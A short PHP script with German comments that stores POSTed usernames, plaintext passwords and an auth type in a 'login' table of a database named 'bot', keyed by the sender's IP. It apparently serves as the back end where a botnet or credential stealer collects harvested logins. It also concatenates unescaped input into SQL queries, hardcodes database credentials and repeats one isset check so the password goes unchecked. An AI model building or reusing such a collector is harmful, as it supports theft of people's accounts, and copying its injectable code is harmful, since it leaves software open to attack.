<?php

// Validate IP-Address
function validateIpAddress($ip_addr)
{
  //first of all the format of the ip address is matched
  if(preg_match("/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/",$ip_addr))
  {
    //now all the intger values are separated
    $parts=explode(".",$ip_addr);
    //now we need to check each part can range from 0-255
    foreach($parts as $ip_parts)
    {
      if(intval($ip_parts)>255 || intval($ip_parts)<0)
      return false; //if number is not within range of 0-255
    }
    return true;
  }
  else
    return false; //if format of ip address doesn't matches
}

// Setting up the MySQL Connection
$mysqlhost="localhost"; // MySQL-Host angeben
$mysqluser="bdd"; // MySQL-User angeben
$mysqlpwd="bdd"; // Passwort angeben
$mysqldb="bot"; // Gewuenschte Datenbank angeben

$connection=mysql_connect($mysqlhost, $mysqluser, $mysqlpwd) or die ("Verbindungsversuch fehlgeschlagen");
mysql_select_db($mysqldb, $connection) or die("Konnte die Datenbank nicht waehlen.");

// Get IP-Address
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$auth_type = $_POST['auth_type'];

// Is the POST-Variable "init" set?
if (validateIpAddress($ip) && isset($user) && isset($user))
{
	$sql = "SELECT * FROM login WHERE ip ='" . $ip . "' AND user = '" . $user . "'";
	$adressen_query = mysql_query($sql) or die("Anfrage nicht erfolgreich");
	$anzahl = mysql_num_rows($adressen_query);
	
	// Es existiert bereits ein Eintrag mit dieser IP und Benutzer, also Updaten...
	if ($anzahl === 1)
	{
		$sql = "UPDATE login SET pass = '" . $pass . "', auth_type = '" . $auth_type . "', last_login = NOW() WHERE ip ='" . $ip . "' AND user = '" . $user . "'";
	}
	else
	{
		$sql = "INSERT INTO login (ip, user, pass, auth_type, last_login) VALUES ('" . $ip . "', '" . $user . "', '" . $pass . "', '" . $auth_type . "', NOW())";
	}
	
	$adressen_query = mysql_query($sql) or die("Anfrage nicht erfolgreich");
}
else
{
	echo "Error";
}

?>